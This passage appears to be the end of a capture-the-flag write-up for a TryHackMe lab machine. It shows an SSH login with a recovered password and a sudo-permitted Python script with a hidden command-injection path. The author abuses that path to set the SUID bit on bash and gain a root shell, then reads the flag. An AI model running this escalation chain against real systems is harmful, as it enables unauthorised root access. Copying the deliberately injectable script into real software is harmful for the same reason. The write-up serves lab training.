 8 Y88. .P  888  `888P"Y88b  d88' `88b `888P"Y88bP"Y88b  d88' `88b `888P"Y88b  `888  d88' `"Y8 
 8  `888'   888   888   888  888ooo888  888   888   888  888   888  888   888   888  888       
 8    Y     888   888   888  888    .o  888   888   888  888   888  888   888   888  888   .o8 
o8o        o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' 


******************************* Welcome to Mnemonic Encryption Software *********************************
*********************************************************************************************************
***************************************** Author:@villwocki *********************************************
*********************************************************************************************************
****************************** https://www.youtube.com/watch?v=pBSR3DyobIY ******************************
---------------------------------------------------------------------------------------------------------


Access Code image file Path:~/Mnemonic/maxresdefault.jpg
File exists and is readable


Processing:0.txt'dir.


*************** PROCESS COMPLETED ***************
Image Analysis Completed Successfully. Your Special Code:
[18040524736954552171240290634275910766959300482314707502901100419741398548965224725941021802487
...
(1) ENCRYPT (2) DECRYPT

>>>>2
ENCRYPT Message to file Path'

Please enter the file Path:~/Mnemonic/6450.txt
 
 
 
pasificbell1981
 
 
PRESS TO QU\u0130T 'ENTER' OR 'E' PRESS TO CONT\u0130NUE.

```

<br>

<p>Used sshpass this time to learn.</p>

```bash
:~/Mnemonic# apt install sshpass
Reading package lists... Done
Building dependency tree       
Reading state information... Done
...
:~/Mnemonic# sshpass -p "pasificbell1981" ssh -p 1337 condor@10.10.2.180
...
condor@mnemonic:~$ id
uid=1002(condor) gid=1002(condor) groups=1002(condor)
condor@mnemonic:~$ pwd
/home/condor
condor@mnemonic:~$ ls
'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
condor@mnemonic:~$ sudo -l
[sudo] password for condor: 
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
condor@mnemonic:~$ cat /bin/examplecode.py
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print 


	print("""

	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------""")
	time.sleep(2)
	print("\nRunning...")
	time.sleep(2)
	os.system(command="clear")
	main()


def main():
	info()
	while True:
		select = int(input("\nSelect:"))

		if select == 1:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip a")
			print("Main Menü press '0' ")
			print(x)

		if select == 2:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ifconfig")
			print(x)

		if select == 3:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip route show")
			print(x)

		if select == 4:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="cat /etc/os-release")
			print(x)

		if select == 0: 
			time.sleep(1)
			ex = str(input("are you sure you want to quit ? yes : "))
		
			if ex == ".":
				print(os.system(input("\nRunning....")))
			if ex == "yes " or "y":
				sys.exit()
                      

		if select == 5:                     #root
			time.sleep(1)
			print("\nRunning")
			time.sleep(2)
			print(".......")
			time.sleep(2)
			print("System rebooting....")
			time.sleep(2)
			x = os.system(command="shutdown now")
			print(x)

		if select == 6:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="date")
			print(x)




		if select == 7:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="rm -r /tmp/*")
			print(x)

                      
              


       


            

def info():                         #info print function
	print("""

	#Network Connections   [1]

	#Show \u0130fconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

	#Exit                  [0]

	""")

def run(): # run function 
	text()

run()
condor@mnemonic:~$ 
<br>

<p><code>THM{congratulationsyoumadeithashme}</code></p>

```bash

condor@mnemonic:~$ sudo /usr/bin/python3 /bin/examplecode.py


	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------

Running...



	#Network Connections   [1]

	#Show \u0130fconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

	#Exit                  [0]

	

Select:0
are you sure you want to quit ? yes : .

Running....chmod +s /bin/bash
0
condor@mnemonic:~$ /bin/bash -p
bash-4.4# pwd
/home/condor
bash-4.4# cd /root
bash-4.4# ls -la
total 44
drwx------  6 root root 4096 Jul 15  2020 .
drwxr-xr-x 24 root root 4096 Jul 13  2020 ..
lrwxrwxrwx  1 root root    9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Jul 13  2020 .cache
-rw-r--r--  1 root root  221 May 11 17:25 f2.txt
drwx------  3 root root 4096 Jul 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jul 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   36 Jul 13  2020 root.txt
drwx------  2 root root 4096 Jul 13  2020 .ssh
-rw-------  1 root root    0 Jul 15  2020 .viminfo
-rw-r--r--  1 root root  165 Jul 14  2020 .wget-hsts
bash-4.4# cat f2.txt
b' 17:25:04 up 19 min,  1 user,  load average: 0.00, 0.05, 0.18\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\ncondor   pts/0    10.10.125.102    17:23    7.00s  0.03s  0.01s sshd: condor [priv] \n'bash-4.4# cat root.txt
THM{congratulationsyoumadeithashme}
bash-4.4# 
```

<br>

```bash
:~/Mnemonic# echo -n "congratulationsyoumadeithashme" | md5sum
2a4825f50b0c16636984b448669b0586  -
```

<br>

![image](https://github.com/user-attachments/assets/7fb3ab12-9f8a-43c6-bcda-ff7346b0faf0)




<br>

<p><code>THM{congratulationsyoumadeithashme}</code> --> <code>THM{2a4825f50b0c16636984b448669b0586}</code></p>


<br>
<br>



![image](https://github.com/user-attachments/assets/f399a328-a10b-4f52-bcb4-2ff6b0873c95)

<br>


![image](https://github.com/user-attachments/assets/c666ded7-3998-4fb2-ac7c-7aae65687f42)

<br>
<br>

![image](https://github.com/user-attachments/assets/bb09e7a3-8187-499d-8fe2-01f92084d36f)


<br>
<br>

![image](https://github.com/user-attachments/assets/65129f46-1c17-46ca-a43f-fbc87a38e965)

<br>
<br>

![image](https://github.com/user-attachments/assets/c87038ae-6d6c-4399-bfcd-ed8da50453be)

<br>
<br>


![image](https://github.com/user-attachments/assets/bb16b73c-56af-4038-9bdb-4bf6948ece66)

<br>

![image](https://github.com/user-attachments/assets/25ad13df-4178-4a1d-811f-5ec90625c938)

![image](https://github.com/user-attachments/assets/2569ffcb-389f-4ccb-b9e9-bc21e1e9a750)

<br>




![image](https://github.com/user-attachments/assets/ce99fc40-db8f-4e4e-816f-ec56b829422a)










![image](https://github.com/user-attachments/assets/ce4e1871-0064-49af-aaa9-848b7ad501d2)


![image](https://github.com/user-attachments/assets/38d8ecd1-2619-4f0a-9a63-b942c168ecb2)





![image](https://github.com/user-attachments/assets/2e5435f8-7fa6-462d-9ad0-0d8a88512e47)

<br>

![image](https://github.com/user-attachments/assets/7eb9ffbe-0965-4537-8cd0-fe19aa989463)

<br>

![image](https://github.com/user-attachments/assets/acff34b3-5d1f-476e-9d38-fe1cb25bc09f)

<br>

![image](https://github.com/user-attachments/assets/6e3bcec3-8df8-427e-84eb-6309755f7700)

<br>

![image](https://github.com/user-attachments/assets/835ee8f7-4d44-44dc-82b1-36528e599d6d)






